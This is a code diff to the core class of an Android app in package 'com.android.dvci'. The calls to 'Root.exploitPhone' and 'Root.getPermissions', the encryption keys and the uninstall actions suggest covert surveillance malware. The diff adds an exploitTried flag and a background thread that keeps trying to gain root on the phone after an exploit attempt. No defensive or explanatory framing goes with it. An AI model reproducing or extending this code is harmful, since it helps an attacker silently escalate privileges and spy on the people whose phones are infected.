@@ -8,6 +8,7 @@
 package com.android.dvci;
 
 import java.io.IOException;
+import java.util.concurrent.Semaphore;
 
 import android.app.Activity;
 import android.app.ActivityManager;
@@ -22,7 +23,6 @@ import com.android.dvci.action.Action;
 import com.android.dvci.action.SubAction;
 import com.android.dvci.action.UninstallAction;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.ConfType;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.crypto.Keys;
@@ -73,6 +73,7 @@ public class Core extends Activity implements Runnable {
 	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
+	private boolean exploitTried = false;
 
 	@SuppressWarnings("unused")
 	private void Core() {
@@ -102,7 +103,7 @@ public class Core extends Activity implements Runnable {
 	/**
 	 * Start.
 	 *
-	 * @param r
+	 * @param resources
 	 *            the r
 	 * @param cr
 	 *            the cr
@@ -114,11 +115,35 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
 			}
-
-			if(!Status.haveRoot()) {
-				// TODO: da ripristinare con un semaforo
-				//Root.getPermissions();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "  exploitStatus == " + exploitTried);
 			}
+
+			if (exploitTried && !Status.haveRoot()) {
+				try {
+					Thread t = new Thread(new Runnable() {
+						@Override
+						public void run() {
+							Root.getPermissions();
+						}
+					});
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "starting thread: Root.getPermissions();");
+					}
+					t.start();
+
+				} catch (Exception ex) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "Error: " + ex);
+					}
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (Start): don't calling getPermissions() haveRoot=" + Status.haveRoot() + " exploitStatus != TRIED " + exploitTried);
+				}
+
+			}
+
 			return false;
 		}
 
@@ -222,6 +247,7 @@ public class Core extends Activity implements Runnable {
 
 		Keys.self();
 		Root.exploitPhone(true);
+		exploitTried = true;
 		Root.getPermissions();
 
 		if (Status.haveRoot()) {
@@ -713,7 +739,7 @@ public class Core extends Activity implements Runnable {
 	 *
 	 * @param action
 	 *            the action
-	 * @param baseEvent
+	 * @param trigger
 	 * @return the int
 	 */
 	private Exit executeAction(final Action action, Trigger trigger) {
